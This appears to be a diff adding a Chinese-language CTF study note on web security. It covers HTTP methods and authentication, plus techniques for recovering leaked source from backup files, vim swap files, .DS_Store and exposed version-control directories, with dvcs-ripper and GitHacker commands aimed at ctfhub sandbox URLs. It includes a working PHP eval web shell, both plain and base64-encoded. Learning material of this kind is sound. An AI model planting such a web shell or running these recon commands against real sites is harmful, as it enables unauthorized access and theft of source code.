@@ -1,0 +1,80 @@
+HTTP1.1协议 八种请求方式:
+GET 	请求指定的页面信息，并返回实体主体
+POST	向指定的资源提交数据进行处理请求，数据包含在请求实体中，POST请求会导致新的资源建立或修改已有的资源
+PUT		从客户端向服务器传送的数据取代指定的文档的内容
+HEAD 	类似于GET请求，只不过响应中没有具体的内容，用于获取报头
+DELETE	请求服务器删除指定的页面
+CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器
+OPTIONS 允许客户端查看服务器的性能
+TRACE 	回显服务器收到的请求，主要用于测试或诊断
+
+php 一句话:
+<?php @eval($_POST['angel']);?> 
+#base64 encode  
+PD9waHAgQGV2YWwoJF9QT1NUWydhbmdlbCddKTs/Pg==  
+
+HTTP基本认证 （Basic authentication）:
+在访问某些特定资源时  需要提供用户名密码一类的认证，认证通过后，服务器会返回客户端所请求的数据,安全性很差
+
+HTTP摘要认证:
+服务器选择一些随机数，发送给客户端，客户端用河服务器协商的加密算法对数据进行摘要加密。发送给服务器。
+服务器选择要认证的数据进行加密，对比数据，一致则认证通过
+
+网站源码:
+扫描 .zip .tar .tar.gz .bak 类似后缀名，查看网站目录下是否存在泄露的打包源代码
+
+网站备份文件:
+如查看index.php   扫描是否存在 index.php.bak   对源码进行修改时生成*.bak类似的备份文件，没删除
+
+vim缓存泄露:
+vim编辑器意外中止时  会留下类似*.swp 的交换文件  如index.php.swp 
+vim -r index.php.swp 命令恢复文件  查看泄露的源代码
+
+spring + mybatis + mysql + redis:
+spring专用目录扫描： https://github.com/LandGrey/SpringBootVulExploit 
+熊猫人安全团队： http://39.105.50.71/team/index.html
+
+
+.DS_Store:
+http://challenge-e298cdeadfe002cb.sandbox.ctfhub.com:10080/.DS_Store
+苹果操作系统 .DS_Store 文件泄露  每个文件夹下面都存在这个文件
+下载下来用记事本打开  找出网站的目录结构
+
+
+git 修改记录:
+python3 GitHacker.py http://challenge-3f234df6a9d8e9d3.sandbox.ctfhub.com:10080/.git/   获得git目录修改记录
+cd website_dirctory
+git log --patch  查看修改记录
+
+
+git 恢复修改的文件:
+perl rip-git.pl -v -u http://challenge-e298cdeadfe002cb.sandbox.ctfhub.com:10080/.git/
+git stash list 所有保存的修改   // 列出修改的文件  以及修改ID
+git stash pop  stash@{0}    //恢复修改   只能恢复一次    stash@{0}-代表ID值
+ls -l   //在网站目录里面 查看修改
+git stash apply stash@{0}  //恢复修改  可以恢复多次
+git stash drop stash@{0}  //删除修改
+
+
+SVN泄露:
+perl rip-svn.pl -v -u http://challenge-e298cdeadfe002cb.sandbox.ctfhub.com:10080/.svn/entries
+flag_372315222.txt  文件被删除
+需要使用 dvcs-ripper  下拉 .svn 隐藏目录 查看pristine/ 下的隐藏文件  得到被删除的标志文件 
+
+
+.HG泄露:
+perl rip-hg.pl -v -u http://challenge-e298cdeadfe002cb.sandbox.ctfhub.com:10080/.hg/
+dvcs-ripper  下拉 .HG隐藏目录     查看网站源代码
+
+CVS 泄露:
+perl rip-cvs.pl -v -u http://challenge-dd63b5e7010da0ff.sandbox.ctfhub.com:10080/CVS/
+
+bzr 泄露:
+perl rip-bzr.pl -v -u http://challenge-dd63b5e7010da0ff.sandbox.ctfhub.com:10080/.bzr/
+
+
+弱口令:
+搜索此系统的相关信息  使用默认口令登录后台
+
+
+
